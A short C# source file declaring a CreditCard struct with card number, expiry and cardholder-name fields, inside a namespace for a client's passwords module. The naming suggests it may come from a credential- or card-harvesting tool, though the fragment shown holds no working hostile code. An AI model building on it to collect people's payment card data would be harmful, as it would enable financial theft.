namespace Client.Modules.Passwords.Helpers;

internal struct CreditCard
{
	public string sNumber { get; set; }

	public string sExpYear { get; set; }

	public string sExpMonth { get; set; }

	public string sName { get; set; }
}
